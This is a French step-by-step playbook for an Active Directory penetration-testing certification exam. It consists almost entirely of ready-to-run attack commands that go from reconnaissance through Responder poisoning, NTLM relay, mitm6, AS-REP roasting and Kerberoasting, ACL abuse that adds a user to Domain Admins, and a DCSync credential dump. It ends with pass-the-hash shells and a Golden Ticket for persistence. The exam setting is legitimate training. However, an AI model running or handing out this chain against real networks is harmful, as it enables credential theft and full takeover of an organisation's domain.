# Méthodologie Exam : Déroulé complet

> **Tu viens de recevoir ton accès SSH. Voici exactement ce que tu fais, dans l'ordre.**

---

## Vue d'ensemble

```
Phase 0  → Setup Kali (5 min)
Phase 1  → Reconnaissance (10 min)
Phase 2  → Vecteurs d'attaque en parallèle (20 min)
Phase 3  → Énumération avec le premier compte (15 min)
Phase 4  → Chasse aux flags (10 min)
Phase 5  → Escalade de privilèges (variable)
Phase 6  → Compromission totale (5 min)
```

---

## PHASE 0 : Prise en main de la Kali (5 min)

### 0.1 : Se connecter et créer le dossier de travail

```bash
# Se connecter via SSH
ssh user@IP_KALI

# Créer le dossier de travail immédiatement
mkdir -p ~/certif/{scans,hashes,tickets,loot,logs,bloodhound}
cd ~/certif

# Créer le fichier de notes
cat > notes.txt << 'EOF'
=== ÉPREUVE CERTIF AD ===

# Informations fournies
DC_IP=
DOMAIN=
DC_FQDN=
RANGE=

# Credentials obtenus
USER=
PWD=
HASH=  (format LM:NT)
NT_HASH=  (partie NT uniquement)

# Flags trouvés
FLAG1=
FLAG2=

# Progression
[ ] Phase 0 - Setup
[ ] Phase 1 - Reco
[ ] Phase 2 - Accès initial
[ ] Phase 3 - Énumération
[ ] Phase 4 - Flags
[ ] Phase 5 - Escalade
[ ] Phase 6 - Compromission
EOF
```

### 0.2 : Identifier le réseau

```bash
ip a                     # Voir ses interfaces et IPs
ip route                 # Voir les routes (identifier le réseau cible)
```

**Ce que tu notes :**
- Mon IP attaquant : `ATTACKER_IP`
- Interface réseau : `IFACE` (eth0, eth1, ens33...)
- Réseau cible : `RANGE` (192.168.X.0/24)

### 0.3 : Définir les variables

```bash
# REMPLIR avec les vraies valeurs avant de continuer
export IFACE="eth0"
export RANGE="192.168.X.0/24"
export DC_IP="192.168.X.10"          # à compléter après reco
export DC_FQDN="dc01.dom.local"      # à compléter après reco
export DOMAIN="DOM"                   # à compléter après reco
export DOMAIN_FQDN="dom.local"       # à compléter après reco
export ATTACKER_IP="192.168.X.99"    # ton IP
export USER=""                        # à remplir dès qu'on a un compte
export PWD=""
export NT_HASH=""
```

---

## PHASE 1 : Reconnaissance (10 min)

### 1.1 : Découverte des hôtes

```bash
# Scan rapide
nmap -sn $RANGE -oA ~/certif/scans/hosts_alive &
nxc smb $RANGE 2>/dev/null | tee ~/certif/scans/smb_hosts.txt &

# Chercher le DC : port 88 = Kerberos = DC
nmap -p 88 --open $RANGE
```

**Résultat attendu :** L'IP du DC (celui avec le port 88 ouvert)

### 1.2 : Scanner le DC en profondeur

```bash
export DC_IP="REMPLACER_PAR_IP_DC"

nmap -Pn -sC -sV \
    -p 53,88,135,139,389,445,464,636,3268,3269,3389,5985 \
    $DC_IP -oA ~/certif/scans/dc_full &

# Chercher des vulnérabilités SMB en parallèle
nmap -Pn --script smb-vuln* -p 139,445 $RANGE | tee ~/certif/scans/vulns.txt &
```

### 1.3 : Identifier le nom de domaine

```bash
nslookup $DC_IP               # reverse lookup → donne le FQDN
dig axfr $DOMAIN_FQDN @$DC_IP  # zone transfer (si fonctionnel)
nxc smb $DC_IP                 # affiche le domaine dans la sortie
```

**Résultat attendu :** `DOMAIN`, `DOMAIN_FQDN`, `DC_FQDN`

```bash
# Mettre à jour les variables avec les vraies valeurs
export DC_FQDN="dc01.entreprise.local"
export DOMAIN="ENTREPRISE"
export DOMAIN_FQDN="entreprise.local"

# Configurer /etc/hosts et DNS
echo "$DC_IP  $DC_FQDN  $DOMAIN_FQDN" | sudo tee -a /etc/hosts
echo "nameserver $DC_IP" | sudo tee /etc/resolv.conf
```

### 1.4 : Responder en écoute passive

```bash
sudo responder -I $IFACE -A    # mode analyse : juste observer
```

**Si des requêtes LLMNR/NBT-NS apparaissent :** vecteur Responder actif disponible.

---

## PHASE 2 : Vecteurs d'attaque en parallèle (20 min)

> Ouvrir **4 terminaux**. Lancer ces attaques simultanément.

### Terminal 1 : Responder actif

```bash
# Vérifier qu'on a vu du trafic LLMNR/NBT-NS en phase 1
sudo responder -I $IFACE -rdw

# En attente de captures... dès qu'un hash apparaît :
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
    /usr/share/wordlists/rockyou.txt &
```

### Terminal 2 : Relay NTLM

```bash
# Trouver les machines sans signature SMB
nxc smb $RANGE --gen-relay-list ~/certif/targets_relay.txt
cat ~/certif/targets_relay.txt  # y a-t-il des cibles ?

# Si oui : désactiver SMB et HTTP dans Responder.conf (sur le terminal 1)
# puis lancer le relay
ntlmrelayx.py -tf ~/certif/targets_relay.txt -smb2support -socks
```

### Terminal 3 : Énumération sans auth + AS-REP

```bash
# Obtenir une liste d'utilisateurs
nxc smb $DC_IP -u '' -p '' --rid-brute 5000 2>/dev/null \
    | grep SidTypeUser \
    | awk -F'\' '{print $NF}' | cut -d' ' -f1 \
    > ~/certif/users.txt

echo "Users trouvés : $(wc -l < ~/certif/users.txt)"

# AS-REP Roasting sans credentials
GetNPUsers.py $DOMAIN_FQDN/ -no-pass \
    -usersfile ~/certif/users.txt \
    -dc-ip $DC_IP \
    -outputfile ~/certif/hashes/asrep.hash

# Cracker immédiatement si hash obtenu
[[ -s ~/certif/hashes/asrep.hash ]] && \
    hashcat -m 18200 ~/certif/hashes/asrep.hash /usr/share/wordlists/rockyou.txt
```

### Terminal 4 : MITMv6

```bash
# IPv6 actif sur le réseau ? (souvent oui)
sudo mitm6 -d $DOMAIN_FQDN -i $IFACE &

# Relay IPv6 vers LDAP
ntlmrelayx.py -6 -t ldaps://$DC_IP \
    --delegate-access --add-computer
```

### Dès qu'on a un compte valide

```bash
# Tester immédiatement sur tout le réseau
export USER="alice"
export PWD="Password2024"
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN --continue-on-success

# Vérifier aussi WinRM et LDAP
nxc winrm $RANGE -u $USER -p $PWD -d $DOMAIN
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN

# Mettre à jour notes.txt
echo "USER=$USER" >> ~/certif/notes.txt
echo "PWD=$PWD" >> ~/certif/notes.txt
```

---

## PHASE 3 : Énumération avec le compte obtenu (15 min)

### 3.1 : BloodHound en premier

```bash
# Lancer la collecte (en arrière-plan pendant qu'on fait le reste)
bloodhound-python \
    -u $USER -p $PWD \
    -d $DOMAIN_FQDN -dc $DC_FQDN -ns $DC_IP \
    -c All --zip -o ~/certif/bloodhound/ &

# Démarrer BloodHound
sudo neo4j start
bloodhound &
```

### 3.2 : Cartographie réseau avec nxc

```bash
# Résumé des accès sur tout le réseau
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN | tee ~/certif/loot/nxc_network.txt

# Partages accessibles
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN --shares | tee ~/certif/loot/shares.txt

# Users et groupes
nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --users | tee ~/certif/loot/users.txt
nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --groups | tee ~/certif/loot/groups.txt
```

### 3.3 : Dump LDAP

```bash
ldapdomaindump -u "$DOMAIN\\$USER" -p $PWD $DC_IP -o ~/certif/loot/ldap/

# Chercher des credentials dans les descriptions
grep -i "pass\|pwd\|cred\|secret\|flag" ~/certif/loot/ldap/domain_users.json
```

---

## PHASE 4 : Chasse aux flags (10 min)

### 4.1 : SYSVOL et NETLOGON

```bash
# Explorer SYSVOL
smbclient //$DC_IP/SYSVOL -U $DOMAIN/$USER%$PWD

# Dans smbclient :
smb: \> recurse ON
smb: \> ls
smb: \> mget *
# CTRL+C pour arrêter le download

# Chercher des cpassword GPP (après téléchargement)
find ~/certif/loot/ -name "Groups.xml" 2>/dev/null | xargs grep -l "cpassword" 2>/dev/null

# Déchiffrer les cpassword trouvés
gpp-decrypt 'CPASSWORD_VALUE'
```

### 4.2 : Partages custom

```bash
# Voir les partages inhabituels (pas admin$, c$, sysvol, netlogon)
grep -v "ADMIN\$\|C\$\|SYSVOL\|NETLOGON\|IPC\$" ~/certif/loot/shares.txt

# Se connecter aux partages suspects
smbclient //$SERVER/$SHARE -U $DOMAIN/$USER%$PWD

# Spider automatique
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN -M spider_plus
```

### 4.3 : Fichiers à cibler

```bash
# Types de fichiers intéressants
find ~/certif/loot/ -name "*.txt" -o -name "*.xml" -o -name "*.ps1" \
    -o -name "*.ini" -o -name "*.bat" | xargs grep -li "flag\|pass\|cred" 2>/dev/null

# Chercher des flags (format habituel : FLAG{...} ou flag{...})
grep -r "FLAG\|flag\|CTF\|certif" ~/certif/loot/ 2>/dev/null | head -20
```

### 4.4 : Épreuve à tiroir

> Chaque flag peut contenir des credentials ou des indices pour la suite.

```bash
# Si un flag contient user:password → tester immédiatement
nxc smb $RANGE -u $NEW_USER -p $NEW_PWD -d $DOMAIN --continue-on-success
nxc winrm $RANGE -u $NEW_USER -p $NEW_PWD -d $DOMAIN

# Mettre à jour les variables si nouveau compte
export USER="$NEW_USER"
export PWD="$NEW_PWD"
```

---

## PHASE 5 : Escalade de privilèges (variable)

### 5.1 : Lire BloodHound AVANT de choisir une technique

```bash
# Importer le zip dans BloodHound si pas encore fait
# Analysis → "Find Shortest Paths to Domain Admins"
# Marquer son compte comme "Owned"
```

### 5.2 : Selon le chemin BloodHound

**Chemin ACL :**

```bash
# ForceChangePassword sur un compte ?
bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP \
    set password $TARGET_USER 'Pwn3d2024!'

# AddMember vers Domain Admins ?
bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP \
    add groupMember 'Domain Admins' $USER
```

**Kerberoasting :**

```bash
GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD -dc-ip $DC_IP \
    -request -outputfile ~/certif/hashes/kerberoast.hash
hashcat -m 13100 ~/certif/hashes/kerberoast.hash \
    /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**AS-REP Roasting (avec credentials) :**

```bash
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN \
    --asreproast ~/certif/hashes/asrep.hash
hashcat -m 18200 ~/certif/hashes/asrep.hash /usr/share/wordlists/rockyou.txt
```

### 5.3 : Tester chaque nouveau compte obtenu

```bash
# Nouveau compte après escalade → tester partout
nxc smb $RANGE -u $PRIV_USER -p $PRIV_PWD -d $DOMAIN

# Vérifier si DA
nxc smb $DC_IP -u $PRIV_USER -p $PRIV_PWD -d $DOMAIN
# Si (Pwn3d!) sur le DC → Domain Admin !
```

---

## PHASE 6 : Compromission totale (5 min)

### 6.1 : DCSync

```bash
secretsdump.py $DOMAIN/$PRIV_USER:'$PRIV_PWD'@$DC_IP \
    -just-dc-ntlm | tee ~/certif/loot/ntds_dump.txt

# Extraire les hashes prioritaires
ADMIN_HASH=$(grep "Administrator:" ~/certif/loot/ntds_dump.txt | head -1 | awk -F':' '{print $4}')
KRBTGT_HASH=$(grep "krbtgt:" ~/certif/loot/ntds_dump.txt | head -1 | awk -F':' '{print $4}')
DOMAIN_SID=$(grep "Domain SID" ~/certif/loot/ntds_dump.txt | awk '{print $NF}')

echo "ADMIN_HASH: $ADMIN_HASH"
echo "KRBTGT_HASH: $KRBTGT_HASH"
echo "DOMAIN_SID: $DOMAIN_SID"
```

### 6.2 : Connexion Administrator

```bash
psexec.py -hashes :$ADMIN_HASH $DOMAIN/Administrator@$DC_IP
# OU
evil-winrm -i $DC_IP -u Administrator -H $ADMIN_HASH
```

### 6.3 : Golden Ticket (persistance)

```bash
ticketer.py -nthash $KRBTGT_HASH \
            -domain-sid $DOMAIN_SID \
            -domain $DOMAIN_FQDN \
            Administrator

export KRB5CCNAME=$PWD/Administrator.ccache
psexec.py -k -no-pass $DOMAIN/Administrator@$DC_FQDN
```

### 6.4 : Chercher les flags restants avec Administrator

```bash
# Spider complet en tant qu'Administrator
nxc smb $RANGE -u Administrator -H $ADMIN_HASH -d $DOMAIN -M spider_plus

# Chercher des flags
grep -r "FLAG\|flag" /tmp/nxc_spider_plus/ 2>/dev/null
```

---

## Erreurs fréquentes et solutions

| Erreur | Cause | Solution |
|--------|-------|----------|
| `Clock skew too great` | Décalage horaire avec DC | `sudo ntpdate $DC_IP` |
| `Connection refused` | Port fermé | Vérifier le port avec nmap |
| `STATUS_LOGON_FAILURE` | Mauvais credentials | Vérifier user/pass, essayer avec hash |
| `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` | Nom de domaine incorrect | Vérifier `DOMAIN_FQDN` dans /etc/hosts |
| `LDAP Error` | DNS pas configuré | `echo "nameserver $DC_IP" | sudo tee /etc/resolv.conf` |
| `smb2 signing required` | Signing forcé | Utiliser Kerberos ou chercher d'autres cibles |
| `-just-dc-ntlm` ne fonctionne pas | Pas les droits DCSync | Vérifier que le compte est DA ou a les droits DCSync |

---

## Checklist finale

```
Phase 0 : [ ] Dossier créé  [ ] Variables définies  [ ] /etc/hosts configuré
Phase 1 : [ ] DC identifié  [ ] DOMAIN noté  [ ] Réseau cartographié
Phase 2 : [ ] Responder lancé  [ ] Relay configuré  [ ] Premier compte obtenu
Phase 3 : [ ] BloodHound collecté  [ ] Shares explorés  [ ] LDAP dumpé
Phase 4 : [ ] SYSVOL parcouru  [ ] gpp-decrypt utilisé  [ ] Flags SYSVOL trouvés
Phase 5 : [ ] BloodHound lu  [ ] Technique choisie  [ ] Compte privilégié obtenu
Phase 6 : [ ] DCSync réussi  [ ] Hash Admin + KRBTGT  [ ] Shell sur DC  [ ] Golden Ticket
```
